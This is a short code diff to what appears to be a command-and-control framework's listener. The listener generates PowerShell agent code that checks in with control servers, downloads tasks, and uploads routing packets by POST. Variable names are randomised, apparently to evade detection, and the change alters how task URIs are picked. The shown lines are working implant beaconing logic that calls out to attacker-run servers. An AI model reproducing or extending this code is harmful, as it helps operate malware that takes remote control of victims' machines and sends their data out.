@@ -852,9 +852,8 @@ class Listener:
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $FixedParameters["taskURIs"] | Get-Random
-                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
-                                $result
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
                             }}
                         }}
                         catch [Net.WebException] {{
@@ -898,7 +897,7 @@ class Listener:
 
                                 try {{
                                     # get a random posting URI
-                                    $taskURI = $FixedParameters["taskURIs"] | Get-Random
+                                    $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
                                     $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                     $response.GetResponse()
                                 }}
